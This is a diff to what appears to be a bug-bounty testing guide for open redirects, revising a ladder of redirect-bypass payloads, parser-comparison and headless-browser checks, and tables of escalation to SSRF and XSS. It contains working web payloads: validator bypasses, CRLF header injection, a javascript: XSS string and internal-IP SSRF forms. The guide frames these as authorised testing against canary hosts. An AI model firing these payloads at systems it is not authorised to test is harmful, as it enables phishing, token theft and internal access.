@@ -40,7 +40,8 @@ pre-encode any literal `#`, `&`, `%` or space (`%23`, `%26`, `%25`, `%20`); curl
 
 ```bash
 OOB=zp91234.canary.example      # a host YOU control and can read logs on
-for p in "https://$OOB" "//$OOB" "https:$OOB" "https:/$OOB" "////$OOB" "/\\$OOB" "\\/\\/$OOB" \
+for p in "https://$OOB" "//$OOB" "////$OOB" "/\\$OOB" "\\/\\/$OOB" \
+         "https:/\\$OOB" "https:\\/$OOB" "https:\\\\$OOB" "https:///$OOB" \
          "https://$H@$OOB" "https://$H%40$OOB" "https://$H%5C@$OOB" "https://$H.$OOB" \
          "https://$OOB%23.$H" "https://$OOB%3F.$H" "https://$OOB%2F.$H" "https://$OOB%09" \
          "https%3A%2F%2F$OOB" "%252f%252f$OOB" "/..//$OOB" "/%2f%2f$OOB" \
@@ -61,25 +62,31 @@ curl -sk --max-time 15 "$EP?$P=https://$OOB" | grep -iEo "http-equiv=[\"']refres
 | Observation | Class | Ceiling |
 |---|---|---|
 | `3xx` + `Location: https://$OOB` | server-side | full - chains to SSRF and OAuth |
-| `200` + `<meta http-equiv="refresh" content="0;url=…">` | client-side | phishing and OAuth; **no server fetcher follows it** |
+| `200` + `<meta http-equiv="refresh" content="0;url=…">` | client-side | phishing and OAuth; **no plain HTTP fetcher follows it** - a browser-backed one does |
 | `200` + `location.href = <param>` | client-side DOM | phishing, plus **XSS** if `javascript:`/`data:` survives |
 
 **5. Let a URL parser adjudicate, then a browser.** Every rung of the ladder is a disagreement
 between the validator's parser and the navigator's - make it visible, then let the browser rule.
 
 ```bash
-python3 - <<'PY'
-from urllib.parse import urlsplit, urljoin
-for c in ["//evil.tld", "/\\evil.tld", "https:evil.tld", "https://target.tld@evil.tld", "https://evil.tld#@target.tld"]:
-    print(f"{c:34} stdlib_host={urlsplit(c).netloc!r:24} browser={urljoin('https://target.tld/login', c)}")
-PY
+C='//evil.tld /\evil.tld https:/\evil.tld ////evil.tld https://target.tld@evil.tld https://evil.tld#@target.tld'
+python3 -c 'import sys
+from urllib.parse import urlsplit
+for c in sys.argv[1:]: print(f"{c:32} rfc3986_netloc={urlsplit(c).netloc!r}")' $C
+node -e 'for (const c of process.argv.slice(1)) { let h; try { h = new URL(c, "https://target.tld/login").host } catch (e) { h = "invalid" } console.log(c.padEnd(32), "whatwg_host=" + h) }' $C
 lynx -dump "$EP?$P=//$OOB" 2>/dev/null | head -5 || curl -skL --max-time 20 "$EP?$P=//$OOB" | head -c 200
 chromium --headless --disable-gpu --no-sandbox --virtual-time-budget=8000 \
   --dump-dom "$EP?$P=//$OOB" 2>/dev/null | grep -o 'ZP-CANARY-91234'
 ```
 
-`stdlib_host=''` on a payload the browser sends to `evil.tld` is the bug in one line - exactly what
-`startswith("/")` or `urlsplit(...).netloc in ALLOWED` gets wrong. `lynx` and `curl -L` witness 3xx chains
+Read the two columns as what they are: `rfc3986_netloc` is the **naive validator** (Python's
+`urlsplit`/`urljoin` implement RFC 3986), `whatwg_host` is the **browser** (Node's `URL` is the same
+WHATWG/ada parser Chromium ships). They disagree on exactly the rungs this ladder exists to test:
+`/\evil.tld`, `\/\/evil.tld` and `////evil.tld` all look like harmless paths to `urljoin`, and all
+three navigate to `evil.tld` - never let `urljoin` play the browser or you will kill real findings.
+`rfc3986_netloc=''` beside a `whatwg_host` you own is the bug in one line - exactly what
+`startswith("/")` or `urlsplit(...).netloc in ALLOWED` gets wrong. No node on the box? Go straight to
+the engine below; the browser is the ruling witness either way. `lynx` and `curl -L` witness 3xx chains
 only; `meta refresh` and `location.href` need a real engine, and `vercel-labs/agent-browser` or `browsh`
 drive one from a terminal. The artifact never changes - **your hostname in the address bar with your marker on screen, from a link that starts with the target's domain.**
 
@@ -121,13 +128,14 @@ with **two accounts you own** and your own canary host.
 |---|---|---|
 | `https://$OOB` | no validation at all | `Location: https://$OOB` |
 | `//$OOB` | `startswith("/")` checks - the single most common bug | `Location: //$OOB` |
-| `https:$OOB`, `https:/$OOB` | slash-count normalisation; WHATWG inserts the slashes | `Location: https:$OOB` and the browser lands on `$OOB` |
+| `https:/\$OOB`, `https:\/$OOB`, `https:\\$OOB`, `https:///$OOB` | the scheme with mangled slashes - a validator reads a path, WHATWG parses an authority | `Location` looks path-like, browser host is `$OOB` |
+| `https:$OOB` **only** when the response's own scheme differs (an `http://` page) or the value is parsed with no base | same-scheme `https:$OOB` stays on the target - measured, it resolves to `https://$H/$OOB` | browser host `$OOB`; verify in step 5 before filing |
 | `/\$OOB`, `\/\/$OOB` | backslash treated as path server-side, as `/` by the browser | relative-looking `Location`, browser goes off-site |
 | `https://$H@$OOB`, `https://$H%40$OOB` | `startswith("https://$H")` prefix checks - `$H` is userinfo | `Location` holds both hosts; the browser picks `$OOB` |
 | `https://$OOB%23.$H`, `https://$OOB%3F.$H`, `https://$H.$OOB` | validators that search for `$H` anywhere in the string, or an unanchored regex | `$H` lands in fragment/query, or the authority is a host you registered |
 | `https%3A%2F%2F$OOB`, `%252f%252f$OOB`, `/..//$OOB`, `/%2f%2f$OOB` | one decode too few or too many across proxy and origin; normalisation added by a *previous fix* | decoded form in `Location`, or a patched redirect re-opened |
 | `https://$OOB%09`/`%20`, `http%0d%0a://$OOB`, `%0d%0aLocation:%20https://$OOB` | whitespace stripping, then CRLF into the response | trailer dropped and host accepted, or a second `Location` header |
-| `https://$OOB。$H` (U+3002), `https://$OOB.$H.`, punycode homoglyph | IDNA applied by the browser, not the validator | authority resolves to your host |
+| `https://$H。$OOB` (U+3002), `https://$H.$OOB.`, a homoglyph label inside a domain you own | IDNA applied by the browser, not the validator - the validator sees a string starting with `$H` | authority resolves to `$H.$OOB`, a host you control. Put `$OOB` last: `$OOB。$H` resolves to `$OOB.$H`, the target's own namespace |
 | `javascript:/*--></script><svg onload=…>`, `data:text/html;base64,…` | scheme allow-list absent | script executes - that is `zp-xss` |
 | `2130706433`, `0177.0.0.1`, `[::ffff:127.0.0.1]` as the second hop | numeric-IP forms inside a fetcher's filter | internal host reached - `zp-ssrf` |
 
@@ -153,9 +161,12 @@ Optional tooling if present - `nuclei -l candidates.txt -tags redirect -severity
 | a scanner said "vulnerable" and you have no `Location` line of your own | unverified. Killed until you reproduce by hand |
 | program rules list open redirect as out of scope or informational | killed as a standalone; **still worth building the chain** and filing that instead |
 
-Two honest notes. A `meta refresh` or `location.href` redirect cannot be followed by a server-side
-fetcher, so it does **not** chain to SSRF - say so rather than implying otherwise. And "phishing is now
-possible" is not impact; name the asset the second hop takes.
+Two honest notes. A `meta refresh` or `location.href` redirect is ignored by a plain HTTP fetcher
+(`curl`, `requests`, most image proxies), so it does **not** chain to SSRF there - but a
+browser-backed consumer does execute both, so screenshotters, HTML-to-PDF renderers, link unfurlers
+and "import from URL" features are worth the second hop. Either way, show the fetcher landing on hop
+two before you claim SSRF. And "phishing is now possible" is not impact; name the asset the second
+hop takes.
 
 ---
 
@@ -177,7 +188,7 @@ possible" is not impact; name the asset the second hop takes.
 
 - **Filing it standalone.** Four in five of the top-voted reports in this class paid zero. Chain first.
 - **Reading the string instead of the authority.** Your host in a query parameter is not a redirect.
-- **Trusting `curl` as the witness for a client-side redirect.** It ignores `meta refresh` and JavaScript; the browser decides. Equally, claiming SSRF from a `meta refresh` - nothing server-side follows it.
+- **Trusting `curl` as the witness for a client-side redirect.** It ignores `meta refresh` and JavaScript; the browser decides. Equally, claiming SSRF from a `meta refresh` without showing the consumer follow it - a plain HTTP client never will, a headless-browser renderer will.
 - **Letting curl re-encode a payload.** A literal `#` never leaves your machine, and `--data-urlencode` double-encodes the very payloads that test double decoding.
 - **Calling a `javascript:` sink an open redirect.** It is XSS; the severity and the fix differ.
 - **Pointing a payload at a live third party.** Use a canary host you own - never a real `evil.tld`, a competitor, or another program's asset.
